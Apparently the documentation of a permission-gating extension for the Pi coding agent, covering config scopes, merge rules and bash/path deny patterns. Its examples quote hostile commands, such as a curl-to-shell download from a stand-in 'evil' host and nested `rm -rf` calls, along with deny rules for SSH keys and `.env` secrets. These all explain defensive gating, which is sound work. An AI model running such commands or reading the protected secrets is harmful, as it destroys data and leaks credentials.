# Configuration Reference

## Config File Locations

One unified config file per scope:

| Scope         | Path                                                                                       |
| ------------- | ------------------------------------------------------------------------------------------ |
| Global        | `~/.pi/agent/extensions/pi-permission-system/config.json` (respects `PI_CODING_AGENT_DIR`) |
| Project       | `<cwd>/.pi/extensions/pi-permission-system/config.json`                                    |
| Project-local | `<cwd>/.pi/extensions/pi-permission-system/config.local.json`                              |

Shared project config overrides global config; project-local config overrides shared project config; per-agent frontmatter overrides file config.
The permission prompt writes project approvals only to `config.local.json`, never shared `config.json`.
The local file is user-owned and should normally be ignored by Git.

**Project config requires project trust.**
Project and project-agent scopes (both permission policy and runtime config such as `yoloMode`) are loaded only when Pi reports the project as trusted (`ctx.isProjectTrusted()`).
In an untrusted directory, only global (and global-agent) config applies, so an untrusted repository cannot loosen your global policy; the extension surfaces a loud warning plus a `project_trust.skipped` review-log entry when it skips a project scope.
Grant project trust (or configure `defaultProjectTrust`) to load the project's config; a trust grant reloads project policy on the next `resources_discover` reload.
See [migration/0644-project-trust-gating.md](migration/0644-project-trust-gating.md).

> **Coming from OpenCode?**
> This extension's permission model was inspired by OpenCode's.
> See [OpenCode Compatibility](opencode-compatibility.md) for shared concepts, divergences, and a porting guide.

<!-- -->

> **Tip:** All `~/.pi/agent` paths shown in this document are defaults.
> If the `PI_CODING_AGENT_DIR` environment variable is set, Pi uses that directory instead.

## Merge Precedence

**Precedence order (later wins):**

1. Global config file
2. Shared project config file
3. Project-local config file
4. Global agent frontmatter
5. Project agent frontmatter

The `permission` object uses deep-shallow merge: string-vs-string replaces; both-object shallow-merges pattern maps; string-vs-object the override wins entirely.
Scalar fields (`debugLog`, `permissionReviewLog`, `yoloMode`, `doublePressToConfirm`, `showPersistenceSummary`) use simple replacement.

**Invalid higher-precedence scope fails closed.**
If a non-global scope (shared/local project config, global agent frontmatter, or project agent frontmatter) is present but fails to load or validate, it no longer contributes an empty scope that silently inherits the lower scope's rules.
Instead the effective policy is floored so nothing resolves more permissively than `ask`: every `allow` (including one inherited from a lower scope) is clamped to `ask`, while `deny` and `ask` are unchanged.
So a global `bash: allow` cannot remain effective behind a project scope that was meant to deny bash but contains a typo — bash prompts until the invalid config is fixed.
A validation warning plus a distinct fail-closed notice are emitted, and a fix + reload restores the intended policy.
An invalid **global** scope does not trigger the clamp — it is the lowest precedence, so nothing more permissive is inherited when it fails.
This clamp is deny-preserving and, like `yoloMode`, applied at composition; when `yoloMode` is on it re-permits the floored `ask` back to `allow`, since yolo is an explicit full-permissive opt-in.

## Full Example

```jsonc
{
  "$schema": "https://raw.githubusercontent.com/gotgenes/pi-packages/main/packages/pi-permission-system/schemas/permissions.schema.json",

  // Runtime knobs
  "debugLog": false,
  "permissionReviewLog": true,
  "yoloMode": false,
  "doublePressToConfirm": true,
  "showPersistenceSummary": true,
  "toolInputPreviewMaxLength": 400,
  "toolTextSummaryMaxLength": 120,
  "piInfrastructureReadPaths": [],

  // Non-bash tools that carry shell semantics
  "shellTools": {
    "exec_command": { "commandArgument": "cmd", "workdirArgument": "workdir" }
  },

  // Ordered names of registered live-authority chain links (empty = none)
  "authorizerChain": [],

  // Flat permission policy
  "permission": {
    "*": "ask",                              // universal fallback
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "read": "allow",
    "write": "deny",
    "edit": "deny",
    "bash": {
      "git *": "ask",
      "git status": "allow",
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    },
    "mcp": { "mcp_status": "allow" },
    "skill": { "*": "ask" },
    "external_directory": "ask"
  }
}
```

> **Note:** Trailing commas are **not** supported.
> If parsing fails, the extension falls back to `ask` for all categories.

## Runtime Knobs

| Key                         | Default | Description                                                                                                                                                                                        |
| --------------------------- | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `debugLog`                  | `false` | Enables verbose diagnostic logging to `logs/pi-permission-system-debug.jsonl`                                                                                                                      |
| `permissionReviewLog`       | `true`  | Enables the permission request/denial review log at `logs/pi-permission-system-permission-review.jsonl`. Records bash command strings verbatim — see [Log file sensitivity](#log-file-sensitivity) |
| `yoloMode`                  | `false` | Auto-approves `ask` results instead of prompting when yolo mode is enabled                                                                                                                         |
| `doublePressToConfirm`      | `true`  | Requires a confirming second press of a decision hotkey in the inline TUI dialog (see below). TUI sessions only; set to `false` for single-press.                                                  |
| `showPersistenceSummary`    | `true`  | Shows the exact rule and destination before saving a durable approval. Toggle persistently with `t` in the inline prompt or through `/permission-system`.                                          |
| `toolInputPreviewMaxLength` | `200`   | Max characters of inline JSON shown in permission prompts for tool inputs. Omit to use the default. Set to a large value to disable truncation.                                                    |
| `toolTextSummaryMaxLength`  | `80`    | Max characters of inline pattern/path summaries (grep patterns, find globs, ls paths) in permission prompts. Omit to use the default.                                                              |
| `piInfrastructureReadPaths` | `[]`    | Extra directories to auto-allow for reads, bypassing the `external_directory` gate. Supports `~`/`$HOME`/`${HOME}` expansion and wildcard patterns (`*`, `?`).                                     |
| `authorizerChain`           | `[]`    | Ordered names of registered live-authority chain links to consult before the terminal authorizer (see [Authorizer chain](#authorizer-chain--case-by-case-decision-links)).                         |

Both logs write to `~/.pi/agent/extensions/pi-permission-system/logs/`.
No debug output is printed to the terminal.

### Inline permission dialog (TUI)

In an interactive **TUI** session, an `ask` decision opens an inline keybind dialog with one-key shortcuts:

| Key | Action                                                            |
| --- | ----------------------------------------------------------------- |
| `y` | Approve once                                                      |
| `s` | Approve the proposed pattern for this session                     |
| `e` | Edit the proposed pattern(s)                                      |
| `p` | Persist the proposed pattern(s) for this trusted project          |
| `g` | Persist the proposed pattern(s) globally                          |
| `n` | Deny                                                              |
| `r` | Deny with a reason (opens an inline editor; a reason is required) |

Project persistence is omitted when the project is not trusted.
Arrow keys / `j`/`k` move the highlight, `enter` confirms the highlighted option, and `esc` denies at the decision list or returns from a sub-step.
The edit field supports backspace and `Ctrl+U` to clear.
Press `t` to toggle the sticky `showPersistenceSummary` preference; when enabled, `p` or `g` opens the exact-rule summary and `enter` saves it.
When the summary is disabled, `p` or `g` saves directly after the configured hotkey confirmation.
With `doublePressToConfirm` enabled (the default), a terminal letter hotkey **arms** its action and shows a `Press y again to approve.` hint; press the same key again to commit.
The non-destructive `e` edit step and `p`/`g` summary step open on their first press.
Set `doublePressToConfirm` to `false` to commit terminal actions on the first press.

Pi's tool-expansion binding (`app.tools.expand`, `Ctrl+O` by default) stays live while the dialog is open, so you can expand a truncated tool preview before deciding.
It only toggles the display — it never resolves, commits, or arms the pending decision.
While you are typing a denial reason it is not intercepted, so a rebound printable key still reaches the reason editor.

Non-TUI contexts (RPC / frontend-driven sessions) keep the single-select prompt and are unaffected by `doublePressToConfirm`.

### `piInfrastructureReadPaths` patterns

Each entry is either a plain directory prefix or a wildcard pattern.
Plain entries match any path that starts with the given directory (after `~`/`$HOME`/`${HOME}` expansion).
Wildcard entries use `*` (any characters, including `/`) and `?` (exactly one character).
`*` and `**` are equivalent — both cross directory boundaries.

Example — allow reads from a Homebrew-managed Pi install at any version:

```jsonc
{
  "piInfrastructureReadPaths": [
    "/opt/homebrew/**/@earendil-works/pi-coding-agent/**"
  ]
}
```

### `shellTools` — gating aliased shell tools

The native `bash` tool goes through the full bash enforcement stack: command decomposition, wrapper flooring, path and external-directory token gates, and `bash:` rules.
Some extensions replace `bash` with a differently-named tool — for example [`@howaboua/pi-codex-conversion`](https://github.com/IgorWarzocha/howaboua-pi-stuff) registers `exec_command`, which carries the shell command in a `cmd` argument and an optional working directory in `workdir`.
Without a hint, the permission system cannot tell that such a tool is really a shell, so it gates it as a generic extension tool and the bash rules never apply.

`shellTools` records that hint, and an aliased tool is then gated at full parity with native `bash` — command decomposition, wrapper flooring, path and external-directory token gates, and `bash:` rules — with the invoked tool name preserved in the review log.
Each key is a tool name; its value maps the tool's input arguments (the keys of the tool call's `arguments` object):

```jsonc
{
  "shellTools": {
    "exec_command": { "commandArgument": "cmd", "workdirArgument": "workdir" }
  }
}
```

| Field             | Required | Description                                                               |
| ----------------- | -------- | ------------------------------------------------------------------------- |
| `commandArgument` | yes      | The tool's input argument holding the shell command string (e.g. `cmd`).  |
| `workdirArgument` | no       | The tool's input argument holding the working directory (e.g. `workdir`). |

When `workdirArgument` is set, the tool's working directory is the base the command's relative paths resolve against, and the working directory itself is gated by `external_directory` when it falls outside the session's working directory.

Merge semantics: `shellTools` **shallow-merges by tool name** across global → project.
A project entry overrides a specific tool's mapping on a key collision but never drops a global entry — so adding a project-scoped alias cannot silently remove enforcement for a tool the global config already covers.
To change a specific tool's mapping, set that tool's key at the project scope (the alias object is replaced wholesale, not deep-merged).

`shellTools` only ever *tightens* enforcement and is inert when the named tool is not registered in the current session.
Opting a project out of a shell-aliasing extension is a package-disable concern, not a `shellTools` edit.

### Authorizer chain — case-by-case decision links

The deterministic policy above decides `allow` / `deny` / `ask` for every request.
When a request lands on `ask`, the **authorizer chain** decides who answers it.
By default that is you (an interactive prompt), the subagent-forwarding path, or a headless deny.
A downstream extension can register a **link** — a reviewer that sees the `ask` and returns `allow`, `deny` (with an optional teaching reason), or `defer` to the next link — and the chain ends at the default terminal that always decides.
The canonical use case is a light model judge that reviews asks case by case (e.g. auto-denying an errant typo-path with a corrective reason).

`authorizerChain` is the ordered list of link names to consult, ahead of the terminal:

```jsonc
{
  "authorizerChain": ["model-judge"]
}
```

Three invariants govern the chain:

1. **Config order wins, never registration order.**
   The order in `authorizerChain` — not the order extensions happen to register in — fixes the security-relevant chain order.
2. **A missing link is skipped fail-safe.**
   A name with no registered link is skipped with a logged warning; the `ask` still reaches the terminal.
   Absence of a judge means *more* prompting, never less.
3. **Registration alone grants no authority.**
   Installing a judge extension gives it nothing; a link decides nothing until you name it here (opt-in activation).

The chain owner caps every link with a **bounded-delegation checkpoint**: a link's `allow` on an excluded surface (`external_directory` or the `path` surface) is downgraded to `defer`, so a buggy or over-eager judge can never approve access outside your policy.
Deny and defer are never capped.
The excluded surface is the **gate** surface the rule fired on, not the tool name displayed in the prompt — so a `write` blocked by a `path` rule is capped.
This holds for an ask forwarded up from a subagent exactly as it does for a local one.
See [migration/0635-forwarded-ask-delegation-envelope.md](migration/0635-forwarded-ask-delegation-envelope.md).

Extension authors: register a link from a `permissions:ready` handler via `getPermissionsService().registerAuthorizer(name, authorize)`; the callback receives the ask details and a narrow, session-scoped `PermissionQuery` (`checkPermission` / `getToolPermission`) so it can consult the deterministic engine at gate parity.
Registration returns a disposer, and only one link may hold a given name.
For a complete working example, see [`@gotgenes/pi-permission-model-judge`](https://github.com/gotgenes/pi-packages/tree/main/packages/pi-permission-model-judge): it registers a `model-judge` link on `permissions:ready` that reviews `external_directory` asks and auto-denies mistyped paths with a corrective reason.

---

## Policy Reference

### `permission["*"]` — Universal Fallback

The `"*"` key sets the action used when no surface-specific rule matches:

```jsonc
{
  "permission": {
    "*": "ask"
  }
}
```

Omitting `"*"` defaults to `"ask"` (least privilege).

### Tool Surfaces

Any registered tool name can be a surface key.
A string value is a catch-all for that surface.

| Surface example                               | Description                         |
| --------------------------------------------- | ----------------------------------- |
| `read`, `write`, `edit`, `grep`, `find`, `ls` | Canonical Pi built-in file tools    |
| `bash`                                        | Shell command execution             |
| `mcp`                                         | Registered MCP proxy tool           |
| `task`                                        | Delegation tool                     |
| `third_party_tool`                            | Any other registered extension tool |

```jsonc
{
  "permission": {
    "read": "allow",
    "write": "deny",
    "third_party_tool": "ask"
  }
}
```

Unknown or absent tools are not required in the config.
If a tool is not registered at runtime, this extension blocks it before permission checks run.

#### Path Patterns for File Tools

For path-bearing tools (`read`, `write`, `edit`, `find`, `grep`, `ls`), an object value maps file-path patterns to actions.
Patterns are matched against `input.path` using the same last-match-wins wildcard semantics as bash command patterns.
When Pi's current working directory is known, a relative path input is matched with both its original relative form and its cwd-normalized absolute form, so an absolute allowlist rule and a legacy relative rule can both apply to the same file.
Per-tool path patterns also match the canonical (symlink-resolved) form, at parity with the `path` surface, so a per-tool deny on a sensitive spelling cannot be evaded through a symlink alias (see Symlinked paths below).
`*` matches zero or more of any character **including** path separators — `src/*` matches both `src/foo.ts` and `src/deep/nested/foo.ts`.
There is no single-segment vs. multi-segment distinction; `**` is not a supported token and behaves identically to `*`.

```jsonc
{
  "permission": {
    "read": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "write": {
      "*": "deny",
      "src/*": "allow",
      "tests/*": "allow"
    },
    "edit": {
      "*": "ask",
      "*.lock": "deny"
    }
  }
}
```

String shorthand is still supported and behaves identically — `"read": "allow"` is equivalent to `"read": { "*": "allow" }`, which permits reads of any path.

Tool injection at agent start is unaffected: a config like `"read": { "*": "allow", "*.env": "deny" }` still exposes the `read` tool to the agent.
Only specific paths are restricted at call time.

### `bash` Surface

Command patterns use wildcards matched against each top-level command in the chain:

- `*` matches zero or more of any character (including `/` and other separators — there is no single-segment vs. multi-segment distinction; `**` is not a supported token and is equivalent to `*`).
- `?` matches exactly one character.

**Last matching rule wins** within a single command — put broad catch-alls first, specific overrides after.

A bash invocation may be a chain of commands joined by `&&`, `||`, `;`, `|`, `&`, or newlines.
Each top-level command is evaluated independently against the patterns, and the most restrictive result wins (`deny` > `ask` > `allow`).
So `cd /repo && npm install x` evaluates both `cd /repo` and `npm install x`; if `npm *` is denied, the whole invocation is denied even when `cd *` is allowed.

Quotes are respected (an operator inside `'…'` or `"…"` does not split the command).
Commands nested inside command substitution (`$(…)`, backticks), process substitution (`<(…)`/`>(…)`), and subshells (`( … )`) are evaluated against the bash patterns too, in addition to their enclosing command — since those inner commands really execute.
So `echo $(rm -rf foo)` evaluates both `echo $(rm -rf foo)` and the inner `rm -rf foo`; if `rm *` is denied, the whole invocation is denied.
The deny reason and the approval prompt note the nested origin (e.g. `inside command substitution`).
Control-flow bodies (`if`/`while`/`for`/`case`) and `{ … }` brace groups are not descended into; their contents are matched as part of the enclosing statement's text.

A leading environment-variable assignment prefix is stripped before matching, so the rule gates the underlying command rather than the prefix.
So `AWS_PROFILE=prod aws ec2 …` is matched as `aws ec2 …` — a `aws *` rule applies even though the invocation begins with `AWS_PROFILE=`.
Prefixes like `PGPASSWORD=` and `KUBECONFIG=` are handled the same way.

A pattern ending with `*` (space + wildcard) also matches the bare command without arguments.
For example, `"git *"` matches both `"git status"` and bare `"git"`.
Place a more specific pattern *after* it to carve out exceptions — the later matching rule wins.

> **Patterns match individual commands, not whole chains.**
> A pattern that embeds a chain operator (e.g. `"cd * && npm *"`) will not match, because each command in the chain is evaluated separately.
> Write one pattern per command instead.

```jsonc
{
  "permission": {
    "bash": {
      "*": "ask",
      "git *": "ask",
      "git status": "allow",
      "git diff": "allow",
      "rm -rf *": "deny",
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    }
  }
}
```

String shorthand sets a catch-all for all bash commands:

```jsonc
{
  "permission": { "bash": "allow" }
}
```

#### Deny with a Custom Reason

In any pattern map, a `deny` value may be written as an object with an optional `reason` instead of the plain `"deny"` string:

```jsonc
{
  "permission": {
    "bash": {
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    }
  }
}
```

The reason is appended to the block message shown to the agent, so it learns why the command was denied and what to do instead:

```text
[pi-permission-system] is not permitted to run 'bash' command 'npm install' (matched 'npm *'). Reason: Use pnpm instead.
```

The object form is only valid at the pattern-value level (inside a pattern map) and only for `deny` — `action` must be `"deny"`, and `reason` must be a string (a non-string reason is ignored).
A bare `"deny"` string is unchanged and carries no reason.

#### Fail-closed behavior

The bash gate fails closed: when in doubt it blocks or prompts, never silently allows.

- If the permission gate throws an internal error (for example a transient tree-sitter parser-init failure), the tool call is **blocked** rather than passed ungated, and a `gate_error` entry is written to the review log naming the failure.
- A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
  An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
- An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
  An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
  So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
- An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
  So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
  As with the opaque floor, there is no way to auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.

Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
To gate bash commands, add `"bash": { "*": "ask" }` (or `"deny"`).
To deliberately opt into permissive bash, set `"bash": { "*": "allow" }` explicitly — that suppresses the warning.

### `mcp` Surface

MCP permissions match against derived targets from tool input:

| Target type       | Examples                                                              |
| ----------------- | --------------------------------------------------------------------- |
| Baseline ops      | `mcp_status`, `mcp_list`, `mcp_search`, `mcp_describe`, `mcp_connect` |
| Server name       | `myServer`                                                            |
| Server/tool combo | `myServer:search`, `myServer_search`                                  |
| Generic           | `mcp_call`                                                            |

```jsonc
{
  "permission": {
    "mcp": {
      "*": "ask",
      "mcp_status": "allow",
      "mcp_list": "allow",
      "myServer:*": "ask",
      "dangerousServer": "deny"
    }
  }
}
```

> **Note:** Baseline discovery targets auto-allow when any explicit `mcp: allow` rule exists.

String shorthand grants broad MCP access — useful for per-agent overrides:

```yaml
# ~/.pi/agent/agents/researcher.md (respects PI_CODING_AGENT_DIR)
---
name: researcher
permission:
  mcp: allow
---
```

### `skill` Surface

Skill name patterns use `*` and `?` wildcards (note: surface is `skill`, not `skills`):

```jsonc
{
  "permission": {
    "skill": {
      "*": "ask",
      "dangerous-*": "deny",
      "librarian": "allow"
    }
  }
}
```

### `path` Surface

Cross-cutting gate that applies to **all** file access — built-in Pi tools (`read`, `write`, `edit`, `find`, `grep`, `ls`), bash commands, MCP calls (via `input.arguments.path`), and extension tools (via `input.path` or a registered access extractor).
A `path` deny cannot be overridden by a per-tool allow.
Extension and MCP path tools are gated by default — no registration needed — so a `path` deny protects sensitive files from every path-aware tool, not just the built-in six.

```jsonc
{
  "permission": {
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow",
      "~/.ssh/*": "deny"
    }
  }
}
```

The path gate runs before the external-directory and tool gates.
If it denies, the command is blocked without reaching subsequent gates — no wasted prompts.

Path patterns match both the path **as the agent references it** and its canonical (symlink-resolved) form, so a deny on a sensitive spelling cannot be evaded through a symlink alias (see Symlinked paths below).

For bash commands, the extension extracts path-candidate tokens from the command (dot-files like `.env`, relative paths like `src/foo.ts`, and absolute paths) and evaluates each against the path rules.
The most restrictive result across all tokens determines the outcome.
When the current working directory is known, relative bash tokens are matched with cwd-normalized policy values, resolved against the effective directory after literal `cd` commands; a token after a non-literal `cd` (e.g. `cd "$DIR"`) stays conservative and matches only its literal form.

A bare filename with no path shape at all (e.g. `id_rsa` in `cat id_rsa`) is also gated, provided it names a file that actually exists — so `"id_rsa": "deny"` or `"*.pem": "deny"` blocks the file whether it is referenced by a bare name, a relative path, or the `read` tool.
Because the resolved path is matched, this covers a bare **symlink** whose target a rule names: with `".some.secret": "deny"`, `cat a_sym` is denied when `a_sym` points at `.some.secret`.
A bare token that names nothing (e.g. `status` in `git status`, `build` in `npm run build`) is left alone, so ordinary subcommands and branch names never prompt.
An existing file that matches no `path` rule is likewise left alone — the catch-all `"*"` entry alone does not gate it.

A path embedded in a long option (e.g. `--file=/tmp/patterns` in `grep --file=/tmp/patterns target`) is extracted and gated like any other path token; an option value that is not path-shaped (e.g. `--format=json`) is ignored.

On Windows, where a backslash is a path separator, a backslash-relative bash argument (e.g. `dir\file` in `cat dir\file`) is gated by a `path` rule the same as its forward-slash equivalent (`dir/file`) and the same as the file accessed through the `read` tool.
On other platforms a backslash is a legal filename character, so such a token is not treated as a path.

Four orthogonal layers compose with most-restrictive-wins:

| Layer                   | Question                                | Applies to       |
| ----------------------- | --------------------------------------- | ---------------- |
| `path`                  | Is this specific path pattern allowed?  | All tools + bash |
| `external_directory`    | Is accessing outside CWD ok?            | All tools + bash |
| Per-tool patterns       | Is this path ok for this specific tool? | Individual tools |
| `bash` command patterns | Is this command ok?                     | Bash only        |

**Which surface for "allow this directory"?**
Use `path` to **deny** sensitive files everywhere (`.env`, `~/.ssh/*`); use `external_directory` to **allow** a directory outside the working tree (a cache, a sibling project).
Because the layers compose with most-restrictive-wins, a `path` allow cannot loosen an `external_directory: ask` boundary — `ask` is more restrictive than `allow`, so the prompt still fires.
Adding `"~/.cargo/registry": "allow"` to the `path` surface therefore does **not** stop the outside-CWD prompt; put the rule on `external_directory` instead (see below).

Configs without a `path` key behave identically to before — the gate does not fire.
When no `path` key is present, the universal fallback (`permission["*"]`) applies: `"*": "allow"` keeps the gate transparent, while `"*": "deny"` would deny all file access via every surface including `path`.

> **Ordering matters.**
> Rules use last-match-wins.
> `{ "*.env": "deny", "*": "allow" }` allows `.env` because `"*"` is last and matches everything.
> Put the catch-all first: `{ "*": "allow", "*.env": "deny" }`.

#### `.env` recipe

Deny all env files but allow the example template:

```jsonc
{
  "permission": {
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    }
  }
}
```

This denies `.env`, `.env.local`, `.env.production`, and `src/.env`, but allows `.env.example`.
Bash commands like `cat .env`, `cp .env .env.backup`, and `echo secret > .env` (redirect targets) are all caught.

#### Composition with per-tool rules

A per-tool allow does not override a `path` deny — the path gate runs first.
Conversely, a per-tool deny still blocks even when the `path` surface allows:

```jsonc
{
  "permission": {
    "path": { "*": "allow" },
    "read": "deny"
  }
}
```

Here `read` calls pass the `path` gate but are blocked by the `read` tool gate.

### `external_directory` Surface

Controls access to paths outside the active working directory.
Use a pattern map to allow specific directories without opening all external access:

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/development/*": "allow"
    }
  }
}
```

`external_directory` is evaluated before the normal tool permission check.
For example, `read: "allow"` can permit ordinary reads while `external_directory: "ask"` still requires confirmation before reading `../outside.txt` or an absolute path outside `ctx.cwd`.
Optional-path search tools (`find`, `grep`, `ls`) skip this check when no `path` is provided.

#### Allow an outside-CWD cache directory

When an agent keeps reading a local cache outside the working tree — `~/.cargo/registry`, `~/.npm`, `~/go/pkg/mod` — and you want to stop confirming it every time, allow that directory on the `external_directory` surface:

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/.cargo/registry/*": "allow"
    }
  }
}
```

The trailing `*` is required and it crosses subdirectory boundaries: `*` is a greedy match (not a single path segment), so `~/.cargo/registry/*` allows every file beneath the directory, however deep.
Do not write `~/.cargo/registry/**` — `**` is not a distinct globstar, and a single `*` already recurses.
A bare `~/.cargo/registry` (no `*`) matches only the directory entry itself, not the files inside it, which is the usual reason a hand-written allow rule appears to do nothing.
The pattern is stored and displayed as written (`~/.cargo/registry/*`) in logs and approval dialogs.

For caches you only ever **read**, `piInfrastructureReadPaths` is a lighter alternative — it auto-allows read-only tools (`read`, `find`, `grep`, `ls`) and bypasses the gate entirely, but it does not cover `write`/`edit` or bash.
Use `external_directory` when the allowance must apply to every tool.

Bash commands are also covered: the extension parses the command and applies the same gate to every token that resolves outside `ctx.cwd`.
Quoting is understood, so `ls "$HOME/x"` and `ls $HOME/x` are treated alike.

What the bash projection resolves:

- Absolute, home-relative (`~/`), parent-traversal (`../`), and separator-bearing tokens, plus redirect targets (`> out.txt`) and values embedded in long options (`--file=/tmp/patterns`).
- The plain shell variables `$HOME` / `${HOME}` and `$PWD` / `${PWD}`, so `$HOME/x` is gated exactly as `~/x` and the literal absolute spelling, whether or not the target exists.
- Relative tokens, against the working directory produced by folding literal current-shell `cd` commands.
- A bare token (`cat id_rsa`) when it names an existing filesystem entry.

What it deliberately does not resolve: any other variable (`$CONFIG_DIR`), a command substitution (`$(cmd)`), an expansion carrying an operator (`${HOME:-/tmp}`), and a variable reached through an assignment (`CURRENT="$HOME"; ls "$CURRENT"`).
A non-literal `cd` (`cd "$DIR"`) makes the working directory unknown, after which relative tokens are kept literal rather than resolved against a guess.
Commands whose payload is opaque (`bash -c`, `eval`, `sudo`, `xargs`) are floored to `ask` instead of projected.
The governing record is [ADR 0009](https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/decisions/0009-bash-path-projection-completeness-contract.md), which states what the projection guarantees and which gaps are accepted residuals rather than bugs.

(The separate `bash` command-pattern surface does evaluate commands nested inside substitutions and subshells; see that section.) OS device paths (`/dev/null`, `/dev/stdin`, `/dev/stdout`, `/dev/stderr`) are always excluded.

#### Symlinked paths

A `path`, `external_directory`, or per-tool file-pattern rule (`read`/`write`/`edit`/`grep`/`find`/`ls`) matches the path **as the agent references it** and the OS-resolved (symlink-followed) path.
This matters on macOS, where `/tmp` is a symlink to `/private/tmp`: a rule keyed on `/tmp/*` allows access via `/tmp` even though the access resolves to `/private/tmp`, and a rule keyed on `/private/tmp/*` works too.

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "/tmp/*": "allow"
    }
  }
}
```

The same dual-form matching protects the `path` surface and the per-tool file patterns: a `path` (or `read`/`write`/`edit`/`grep`/`find`/`ls`) deny on `~/.ssh/*` or `*.env` also catches a symlink whose resolved target matches the pattern, so a sensitive file cannot be reached through an aliasing symlink.
For `external_directory`, the decision of whether a path is outside the working directory always uses the resolved form, so the gate still fires for every outside-CWD access; only which allow/deny/ask pattern matches considers both forms.

#### Pi Infrastructure Read Auto-Allow

Read-only tools (`read`, `find`, `grep`, `ls`) targeting Pi infrastructure directories are automatically allowed without triggering the gate, even when `external_directory` is `ask` or `deny`.
Infrastructure directories include:

1. The agent config directory (`~/.pi/agent/` or `$PI_CODING_AGENT_DIR`)
2. Git-cloned global packages (`<agentDir>/git/`)
3. The global `node_modules` root (auto-discovered from the extension's own install path; falls back to `npm root -g` when running from a local development checkout)
4. Pi's own install directory (auto-discovered via the coding-agent `getPackageDir()` API, so Pi's bundled docs and examples are readable regardless of install layout)
5. Project-local Pi packages (`<cwd>/.pi/npm/` and `<cwd>/.pi/git/`)
6. Any paths listed in `piInfrastructureReadPaths`

Write tools (`write`, `edit`) to infrastructure paths are **not** auto-allowed and still go through the gate.

On Windows, path matching for `external_directory`, `path`, and the path-bearing tools is case-insensitive and tolerant of either separator (`\` or `/`), matching the case-insensitive filesystem.
The separator folding applies to the rule pattern **and** to the value it is matched against, so either side may be written with either separator.
A mixed-case allow override such as `~/AppData/Roaming/npm/node_modules/@earendil-works/pi-coding-agent/*` therefore matches a lowercased, backslash-normalized path value, and a forward-slash rule such as `"/dev/null"` matches a value that is also spelled with forward slashes.
POSIX matching remains case-sensitive and does not fold separators.

#### Git Bash / MSYS paths on Windows

On Windows, Pi executes bash commands through Git Bash, so a bash token that looks like a POSIX absolute path carries MSYS mount semantics rather than native `node:path.win32` semantics.
The `external_directory` and `path` gates interpret bash tokens accordingly (tool-input paths for `read`/`write`/`edit` keep native Windows semantics, since those tools resolve them through Node's filesystem):

- The safe device paths (`/dev/null`, `/dev/stdin`, `/dev/stdout`, `/dev/stderr`) are recognized as MSYS devices rather than filesystem paths, so they never trigger the `external_directory` gate — the same exclusion that holds on POSIX.
  The cross-cutting `path` surface still governs them on both platforms: if a `path` rule matches the token, it decides.
  A device is therefore allow-listed the way any other path is, written as typed — `path: { "/dev/null": "allow" }`.
- MSYS drive mounts (`/c/…`, `/d/…`) are translated to their Windows equivalent (`C:\…`), so a project file referenced through a mount is matched against its real Windows path and an in-CWD mount is not flagged.
- Every other POSIX-absolute token (`/tmp/foo`, `/usr/bin`) has an install-dependent target this extension cannot resolve deterministically (Git Bash mounts `/tmp` to `%TEMP%`, MSYS2 to its own root), so it is treated as an external path matched and displayed exactly as typed, never rewritten to `C:\tmp\foo`.

To allow-list such a path, write the rule using the path as typed — for example `external_directory: { "/tmp/*": "allow" }` — and the Windows separator folding above makes the forward-slash rule match the Git Bash token.

### Home Directory Expansion in Patterns

Pattern keys in any permission surface can start with `~/`, `$HOME/`, or `${HOME}/` (or be exactly `~`, `$HOME`, or `${HOME}`).
They are expanded to the OS home directory at match time, so configs are portable across machines and users.
A prefix is recognized only when it stands alone or precedes a separator, so a longer name (`~username`, `$HOMEDIR`) and a braced expansion carrying an operator (`${HOME:-/tmp}`) are left alone.

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/development/*": "allow"
    }
  }
}
```

The pattern is stored and displayed as written (e.g. `~/development/*`) in logs and approval dialogs.

Path **values** supplied by tool calls and bash commands are expanded the same way.
This means `~/...`, `$HOME/...`, `${HOME}/...`, and the fully-expanded absolute form all match a single home-anchored pattern: a `read` tool called with path `~/.ssh/config`, `$HOME/.ssh/config`, `${HOME}/.ssh/config`, or `/Users/me/.ssh/config` is all caught by a `"~/.ssh/*": "deny"` rule.

---

## Per-Agent Overrides

Override global permissions for specific agents via YAML frontmatter in Pi agent definition files.

### Global Agent Override

